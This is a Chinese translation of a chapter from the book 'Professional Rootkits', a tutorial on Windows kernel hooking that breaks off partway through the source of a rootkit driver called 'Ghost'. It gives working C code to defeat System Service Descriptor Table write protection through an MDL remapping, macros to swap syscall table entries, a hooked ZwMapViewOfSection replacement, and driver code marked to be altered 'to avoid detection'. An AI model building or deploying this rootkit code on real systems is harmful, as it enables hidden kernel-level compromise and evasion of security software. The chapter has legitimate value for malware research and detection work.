
# Professional.Rootkits 第三章（更新完毕）

> 原文：[`www.pediy.com/kssd/pediy10/63871.html`](https://www.pediy.com/kssd/pediy10/63871.html)

## 第三章: 内核钩子

### 概述

本章将带领大家创建一个内核钩子。内核函数为操作系统高级应用程序提供了运行系统操作所必须的低级函数。通过挂钩内核，一个 rootkit 可以使用高级应用程序来改变低级操作。这样就提供了一个便于控制、监视、过滤和提供一些隐藏可能的机制。

本章包括如下内容：

* 系统调用表
* 内存保护机制
* 内核挂钩指令
* 内核挂钩函数
* 一个基本内核钩子的例子
* 关于内核函数的描述

### 系统调用表

Windows 内核依赖一个函数指针列表来实现系统操作。这个表相当于被 Microsoft 作为系统服务列表或服务描述列表，它可以被修改指向用户指定的函数。挂钩这些系统函数就是本章的焦点。

参考 DDK，`KeServiceDescriptorTable`，提供了一些核心级的进程允许进入系统调用表，但是修改系统调用表和替换核心函数不是一个简单的任务。本章介绍通过系统调用表访问这些函数并给你一些资源来替换这些核心函数。

系统调用表中有一些条目，它们可以将操作由简单字符串操作指向复杂 C/S 操作，因此不要奢望一个晚上就了解系统调用表的全部范围。然而，记住你可以学习更多的系统调用表所涉及的函数，为你实现内核挂钩做好更充分的准备。

### 内核内存保护机制

在挂钩内核函数之前，需要考虑的是设备防修改机制。目前的 Windows 操作系统能够通过将系统调用表设置为只读来保护核心内存。如果不完全的获得它会阻止内核挂钩。内存描述列表如图 3-1 所示。

Figure 3-1

获得被保护的内存的关键在于内存描述表，在微软 Windows 驱动开发包的 `ntddk.h` 文件中被定义。下面是该文件中的定义：

```c
typedef struct _MDL {
    struct _MDL *Next;
    CSHORT Size;
    CSHORT MdlFlags;
    struct _EPROCESS *Process;
    PVOID MappedSystemVa;
    PVOID StartVa;
    ULONG ByteCount;
    ULONG ByteOffset;
} MDL, *PMDL;

#define MDL_MAPPED_TO_SYSTEM_VA 0x0001
#define MDL_PAGES_LOCKED 0x0002
#define MDL_SOURCE_IS_NONPAGED_POOL 0x0004
#define MDL_ALLOCATED_FIXED_SIZE 0x0008
#define MDL_PARTIAL 0x0010
#define MDL_PARTIAL_HAS_BEEN_MAPPED 0x0020
#define MDL_IO_PAGE_READ 0x0040
#define MDL_WRITE_OPERATION 0x0080
#define MDL_PARENT_MAPPED_SYSTEM_VA 0x0100
#define MDL_FREE_EXTRA_PTES 0x0200
#define MDL_IO_SPACE 0x0800
#define MDL_NETWORK_HEADER 0x1000
#define MDL_MAPPING_CAN_FAIL 0x2000
#define MDL_ALLOCATED_MUST_SUCCEED 0x4000
#define MDL_MAPPING_FLAGS (MDL_MAPPED_TO_SYSTEM_VA | \
    MDL_PAGES_LOCKED | \
    MDL_SOURCE_IS_NONPAGED_POOL | \
    MDL_PARTIAL_HAS_BEEN_MAPPED | \
    MDL_PARENT_MAPPED_SYSTEM_VA | \
    MDL_SYSTEM_VA | \
    MDL_IO_SPACE )
```

内存描述表(`MDLs`)是用来将虚拟内存映射到物理页的。如果内存描述表中的内存地址的系统调用表的系统描述表标志位设为 `MDL_MAPPED_TO_SYSTEM_VA` 并且物理页被锁定，那么内核挂钩可以实现。下面的代码段将达到这个结果：

```c
#pragma pack(1)

typedef struct ServiceDescriptorEntry
{
    unsigned int *ServiceTableBase;
    unsigned int *ServiceCounterTableBase;
    unsigned int NumberOfServices;
    unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;

#pragma pack()

__declspec(dllimport) ServiceDescriptorTableEntry_t KeServiceDescriptorTable;

PVOID* NewSystemCallTable;

PMDL pMyMDL = MmCreateMdl( NULL,
    KeServiceDescriptorTable.ServiceTableBase,
    KeServiceDescriptorTable.NumberOfServices * 4 );

MmBuildMdlForNonPagedPool( pMyMDL );

pMyMDL->MdlFlags = pMyMDL->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;

NewSystemCallTable = MmMapLockedPages( pMyMDL, KernelMode );
```

现在挂钩时你可以使新的系统调用表（`NewSystemCallTable`）。图 3-2 所示系统调用表。

Figure 3-2

可以考虑使用下面的宏指令来挂钩：

```c
#define HOOK_INDEX(function2hook) *(PULONG)((PUCHAR)function2hook+1)

#define HOOK(functionName, newPointer2Function, oldPointer2Function )  \
    oldPointer2Function = (PVOID) InterlockedExchange( (PLONG)
    &NewSystemCallTable[HOOK_INDEX(functionName)], (LONG) newPointer2Function)

#define UNHOOK(functionName, oldPointer2Function)  \
    InterlockedExchange( (PLONG) &NewSystemCallTable[HOOK_INDEX(functionName)], (LONG)
    oldPointer2Function)
```

图 3-3 所示挂钩系统调用表。

Figure 3-3

`KeServiceDescriptorTable`(系统调用表)数据结构包含所有 `ntdll.dll` 函数指针并提供需要创建你自己内存描述表的基地址和表大小。如果你创建了一个带有 `MDL_MAPPED_TO_SYSTEM_VA` 标志的无页内存描述表，你可以锁定它并返回地址作为你自己的(可写的)系统调用表。

使用 `#defines` 来让挂钩变得安全和容易。由于 `InterlockedExchange`，使得指针交换方式更安全，一个不需要暂停和终端的基本函数，什么能比使用宏指令挂钩和卸载挂钩要更容易呢？

### 定义一个挂钩函数

内核挂钩的基本部分就是函数挂钩，替换被函数的函数和系统调用表。前面一节已经已经给大家讲了所需要使用的宏指令，但是你仍然需要定义替换被挂钩函数的函数和用来储存原函数地址的函数指针。大多数情况下，你可以在 DDK 头文件中找到函数原型。举个例子来说，下面这个函数原型是在 `ntddk.h` 的，经修改变为替换被挂钩函数的函数。

下面是 `ntddk.h` 定义的原始形式:

```c
NTSYSAPI
NTSTATUS
NTAPI
ZwMapViewOfSection(
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN ULONG ZeroBits,
    IN ULONG CommitSize,
    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
    IN OUT PSIZE_T ViewSize,
    IN SECTION_INHERIT InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Protect );
```

因此，下面所示挂钩原函数的指针：

```c
typedef NTSTATUS (*ZWMAPVIEWOFSECTION)(
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN ULONG ZeroBits,
    IN ULONG CommitSize,
    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
    IN OUT PSIZE_T ViewSize,
    IN SECTION_INHERIT InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Protect );

ZWMAPVIEWOFSECTION OldZwMapViewOfSection;
```

下面所示为替换被挂钩函数的原函数：

```c
NTSTATUS NewZwMapViewOfSection(
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN ULONG ZeroBits,
    IN ULONG CommitSize,
    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
    IN OUT PSIZE_T ViewSize,
    IN SECTION_INHERIT InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Protect )

{
    NTSTATUS status;
    DbgPrint("comint32: NewZwMapViewOfSection called.");

    // we can do whatever we want with the input here
    // and return or continue to the original function
    status = OldZwMapViewOfSection(SectionHandle,
        ProcessHandle,
        BaseAddress,
        ZeroBits,
        CommitSize,
        SectionOffset OPTIONAL,
        ViewSize,
        InheritDisposition,
        AllocationType,
        Protect );

    // we can do whatever we want with the output here
    // and return any value including the actual one
    return status;
}
```

如果这些被定义了，你可以使用下面这些：

```c
HOOK( ZwMapViewOfSection, NewZwMapViewOfSection, OldZwMapViewOfSection );
```

如果你使用了 `DriverUnload()`，注意一定要卸载钩子。

**提示：**

`ZwMapViewOfSection` 是内核函数，它允许应用程序将动态链接库的输出函数映射到内存中。挂钩这个函数来改变 DLL 函数的映射被称作进程注入或用户模式挂钩，这是第四章需要探讨的话题。

### 一个实例

需要挂钩内核系统调用表的功能已经可以通过新建两个文件再修改已存在的两个文件的方法来实现。本书涉及的所有文件和在网上下载得到。

下面是新文件：

* `hookManager.c`
* `hookManager.h`

下面是被修改文件：

* `Ghost.c`
* `SOURCES`

代码如下节所示。

#### SOURCES 文件

将 `hookManager.c` 增加到 `SOURCES` 文件:

```makefile
TARGETNAME=comint32
TARGETPATH=OBJ
TARGETTYPE=DRIVER
SOURCES=Ghost.c\
    fileManager.c\
    hookManager.c\
    configManager.c
```

#### Ghost.c

`Ghost.c` 文件中增加了三个新的全局变量: `NewSystemCallTable`, `pMyMDL`, 和 `OldZwMapViewOfSection`。其中，`NewSystemCallTable` 和 `pMyMDL` 是用来获得修改内存保护的，`OldZwMapViewOfSection` 来保存原始 `ZwMapViewOfSection` 地址。值得注意的是在系统重启时原始的 `ZwMapViewOfSection` 可能不是系统调用表中原来的地址。这个地址可能来自另一个 rootkit 或安全软件。

`DriverUnload` 函数被修改为卸载挂钩 `ZwMapViewOfSection` 并返回 `MDL`。另外，在一个实际运行环境中 `DriverUnload` 可能不是必须的，但是在一个开发环境中它是很有用的。

`Ghost.c` 文件中还需要增加的是调用 `Hook`。`Hook` 在 `hookManager.h` 中被声明并且在 `hookManager.c` 中被执行。为了简单起见，更多复杂的头文件将在执行文件后列出。

执行文件如下:

```c
// Ghost
// Copyright Ric Vieler, 2006

#include "ntddk.h"

#include "Ghost.h"

#include "fileManager.h"

#include "configManager.h"

#include "hookManager.h"

// Used to circumvent memory protected System Call Table
PVOID* NewSystemCallTable = NULL;
PMDL pMyMDL = NULL;

// Pointer(s) to original function(s)
ZWMAPVIEWOFSECTION OldZwMapViewOfSection;

// Global version data
ULONG majorVersion;
ULONG minorVersion;

    // Comment out in free build to avoid detection
VOID OnUnload( IN PDRIVER_OBJECT pDriverObject )
{
    DbgPrint("comint32: OnUnload called.");

    // Unhook any hooked functions and return the Memory Descriptor List
    if( NewSystemCallTable )
    {
        UNHOOK( ZwMapViewOfSection, OldZwMapViewOfSection );
        MmUnmapLockedPages( NewSystemCallTable, pMyMDL );
        IoFreeMdl( pMyMDL );
    }
}

NTSTATUS DriverEntry( IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING theRegistryPath )
{
    DRIVER_DATA* driverData;

    // Get the operating system version
    PsGetVersion( &majorVersion, &minorVersion, NULL, NULL );

    // Major = 4: Windows NT 4.0, Windows Me, Windows 98 or Windows 95
    // Major = 5: Windows Server 2003, Windows XP or Windows 2000
    // Minor = 0: Windows 2000, Windows NT 4.0 or Windows 95
```
